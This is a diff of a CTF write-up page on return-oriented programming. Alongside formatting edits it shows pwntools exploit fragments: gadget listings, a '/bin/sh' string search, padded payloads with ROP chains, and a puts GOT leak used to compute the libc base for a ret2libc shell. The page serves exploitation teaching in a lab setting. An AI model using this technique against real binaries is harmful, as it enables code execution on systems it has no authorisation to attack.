@@ -1,5 +1,5 @@
 ---
-title: "ROP Chain CTF Writeup: Bypassing NX with Gadgets"
+title: "ROP Chain CTF Writeup: Bypassing NX with Gadget Chains"
 sidebarTitle: "ROP Chains"
 description: "Return-oriented programming CTF walkthrough: find gadgets with ROPgadget, chain them to call system(), and bypass NX/DEP protections with pwntools."
 ---
@@ -10,7 +10,7 @@ When a binary has NX (No-Execute) enabled, the CPU will raise a fault the moment
 
 A gadget is a short instruction sequence ending in `ret`. The canonical examples look like:
 
-```
+```asm
 pop rdi ; ret
 pop rsi ; pop r15 ; ret
 mov [rax], rbx ; ret
@@ -41,7 +41,7 @@ ROPgadget --binary challenge --string '/bin/sh'
 
 Sample output for the `pop|ret` filter:
 
-```
+```text
 Gadgets information
 ============================================================
 0x000000000040119e : pop rdi ; ret
@@ -61,7 +61,7 @@ Always search for a bare `ret` gadget (just `0xc3`). You will need it for 16-byt
 The x86-64 System V ABI requires the stack pointer to be **16-byte aligned** at the point of a `call` instruction. Many libc functions (including `system`) use SSE instructions internally that will segfault on a misaligned stack. If your exploit crashes inside `system` rather than giving you a shell, insert a bare `ret` gadget immediately before the `system` call to consume one 8-byte slot and restore alignment.
 </Note>
 
-```
+```text
 stack before system() call — misaligned (8-byte aligned):
 rsp → [ pop rdi addr ]
       [ /bin/sh addr ]
@@ -182,6 +182,7 @@ payload = flat(
     binary.symbols['main']
 )
 p.sendline(payload)
+p.recvuntil(b'\n')                                          # consume banner/prompt
 leaked    = u64(p.recvline().strip().ljust(8, b'\x00'))
 libc_base = leaked - libc.symbols['puts']
 
@@ -216,6 +217,7 @@ rop1.puts(binary.got['puts'])
 rop1.call(binary.symbols['main'])
 
 p.sendline(b'A' * 72 + rop1.chain())
+p.recvuntil(b'\n')                                         # consume banner/prompt
 leaked    = u64(p.recvline().strip().ljust(8, b'\x00'))
 libc.address = leaked - libc.symbols['puts']   # set libc base
 
